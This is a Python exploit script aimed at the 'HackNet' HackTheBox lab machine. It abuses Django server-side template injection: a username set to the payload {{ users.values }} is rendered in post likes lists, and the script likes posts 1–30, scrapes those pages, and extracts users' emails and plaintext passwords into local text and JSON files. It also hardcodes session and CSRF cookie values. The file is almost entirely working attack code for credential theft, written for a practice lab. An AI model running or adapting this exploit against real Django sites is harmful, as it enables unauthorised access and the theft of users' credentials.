#!/usr/bin/env python3
"""
Django SSTI Credential Extraction Script
Target: HackNet HTB Machine
Exploits: Template injection in username field rendered in likes list
"""

import requests
import re
import json
from bs4 import BeautifulSoup
import sys

# ============================================
# CONFIGURATION - Modify for different targets
# ============================================
TARGET_URL = "http://hacknet.htb"
CSRF_TOKEN = "Je5whSRKbAoSt9nQqiYDCkjjzT58prVx"
SESSION_ID = "dd3f6hpdxizwnkaw1wecrmobtyg52uep"

# Post IDs to check (range)
POST_START = 1
POST_END = 30

# Output file
OUTPUT_FILE = "credentials.txt"
OUTPUT_JSON = "credentials.json"

# ============================================
# Setup session with cookies
# ============================================
session = requests.Session()
session.cookies.set('csrftoken', CSRF_TOKEN)
session.cookies.set('sessionid', SESSION_ID)

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Print script banner"""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=" * 60)
    print("  Django SSTI Credential Extraction Tool")
    print("  Target: HackNet HTB")
    print("=" * 60)
    print(f"{Colors.ENDC}")

def like_post(post_id):
    """
    Like a post to ensure our malicious username appears in likes list
    
    Args:
        post_id: ID of the post to like
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        url = f"{TARGET_URL}/like/{post_id}"
        response = session.get(url, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error liking post {post_id}: {e}{Colors.ENDC}")
        return False

def get_likes_data(post_id):
    """
    Fetch the likes list for a post - this triggers the SSTI
    
    Args:
        post_id: ID of the post
    
    Returns:
        str: HTML response containing leaked data
    """
    try:
        url = f"{TARGET_URL}/likes/{post_id}"
        response = session.get(url, timeout=10)
        
        if response.status_code == 200:
            return response.text
        return None
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error fetching likes for post {post_id}: {e}{Colors.ENDC}")
        return None

def extract_credentials_from_html(html_content):
    """
    Extract user credentials from the HTML response
    
    The SSTI payload {{ users.values }} leaks data in img title attributes
    Uses same logic as test_fixed.py - gets the LAST img title which contains QuerySet
    
    Args:
        html_content: HTML response from /likes/ endpoint
    
    Returns:
        list: List of user credential dictionaries
    """
    credentials = []
    
    try:
        # Decode HTML entities first
        import html as html_module
        html_content = html_module.unescape(html_content)
        
        # Find all img titles using regex (same as test_fixed.py)
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', html_content)
        
        if not img_titles:
            return credentials
        
        # Get the LAST title (this is where the SSTI payload appears)
        last_title = img_titles[-1]
        
        # Check if it contains QuerySet or credential data
        if '<QuerySet' not in last_title and 'email' not in last_title and 'password' not in last_title:
            return credentials
        
        # Extract emails and passwords using regex (same as test_fixed.py)
        emails = re.findall(r"'email':\s*'([^']*)'", last_title)
        passwords = re.findall(r"'password':\s*'([^']*)'", last_title)
        ids = re.findall(r"'id':\s*(\d+)", last_title)
        
        # Pair them up (email prefix becomes username)
        for i, (email, password) in enumerate(zip(emails, passwords)):
            username = email.split('@')[0]  # Take email prefix as username
            user_id = ids[i] if i < len(ids) else None
            
            credentials.append({
                'username': username,
                'password': password,
                'email': email,
                'id': user_id
            })
    
    except Exception as e:
        print(f"{Colors.WARNING}[!] Error parsing HTML: {e}{Colors.ENDC}")
    
    return credentials

def save_credentials(credentials, txt_file, json_file):
    """
    Save extracted credentials to files
    
    Args:
        credentials: List of credential dictionaries
        txt_file: Output text file path
        json_file: Output JSON file path
    """
    # Save as JSON
    with open(json_file, 'w') as f:
        json.dump(credentials, f, indent=4)
    
    # Save as formatted text
    with open(txt_file, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("  Extracted Credentials - HackNet\n")
        f.write("=" * 60 + "\n\n")
        
        for i, cred in enumerate(credentials, 1):
            f.write(f"User #{i}:\n")
            f.write(f"  Username: {cred.get('username', 'N/A')}\n")
            f.write(f"  Email:    {cred.get('email', 'N/A')}\n")
            f.write(f"  Password: {cred.get('password', 'N/A')}\n")
            f.write(f"  User ID:  {cred.get('id', 'N/A')}\n")
            f.write("-" * 60 + "\n")
    
    print(f"{Colors.OKGREEN}[+] Credentials saved to:{Colors.ENDC}")
    print(f"    - {txt_file}")
    print(f"    - {json_file}")

def print_credentials(credentials):
    """
    Print credentials to console in a formatted way
    
    Args:
        credentials: List of credential dictionaries
    """
    print(f"\n{Colors.OKGREEN}{Colors.BOLD}[+] Extracted {len(credentials)} user credentials:{Colors.ENDC}\n")
    
    for i, cred in enumerate(credentials, 1):
        print(f"{Colors.OKCYAN}User #{i}:{Colors.ENDC}")
        print(f"  {Colors.BOLD}Username:{Colors.ENDC} {cred.get('username', 'N/A')}")
        print(f"  {Colors.BOLD}Email:{Colors.ENDC}    {cred.get('email', 'N/A')}")
        print(f"  {Colors.BOLD}Password:{Colors.ENDC} {cred.get('password', 'N/A')}")
        if 'id' in cred:
            print(f"  {Colors.BOLD}User ID:{Colors.ENDC}  {cred.get('id')}")
        print()

def main():
    """Main execution function"""
    print_banner()
    
    all_credentials = []
    seen_users = set()  # Track unique users by username
    
    print(f"{Colors.OKBLUE}[*] Starting credential extraction...{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Testing posts {POST_START} to {POST_END}{Colors.ENDC}\n")
    
    # Step 1: Like all posts
    print(f"{Colors.WARNING}[*] Step 1: Liking posts to trigger SSTI...{Colors.ENDC}")
    for post_id in range(POST_START, POST_END + 1):
        if like_post(post_id):
            print(f"  [✓] Liked post {post_id}")
        else:
            print(f"  [✗] Failed to like post {post_id}")
    
    print(f"\n{Colors.WARNING}[*] Step 2: Extracting credentials from likes lists...{Colors.ENDC}")
    
    # Step 2: Fetch likes and extract credentials
    for post_id in range(POST_START, POST_END + 1):
        print(f"  [*] Checking post {post_id}...", end=" ")
        
        html_content = get_likes_data(post_id)
        
        if html_content:
            credentials = extract_credentials_from_html(html_content)
            
            if credentials:
                # Add only unique credentials
                new_creds = 0
                for cred in credentials:
                    username = cred.get('username', '')
                    if username and username not in seen_users:
                        seen_users.add(username)
                        all_credentials.append(cred)
                        new_creds += 1
                
                if new_creds > 0:
                    print(f"{Colors.OKGREEN}Found {new_creds} new credentials!{Colors.ENDC}")
                else:
                    print("(duplicates)")
            else:
                print("No credentials")
        else:
            print(f"{Colors.FAIL}Failed{Colors.ENDC}")
    
    # Step 3: Display and save results
    if all_credentials:
        print_credentials(all_credentials)
        save_credentials(all_credentials, OUTPUT_FILE, OUTPUT_JSON)
        
        print(f"\n{Colors.OKGREEN}{Colors.BOLD}[+] Extraction complete!{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Total unique users found: {len(all_credentials)}{Colors.ENDC}")
    else:
        print(f"\n{Colors.FAIL}[!] No credentials were extracted.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Make sure your username is set to: {{{{ users.values }}}}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] And that you're properly authenticated.{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
        sys.exit(1)
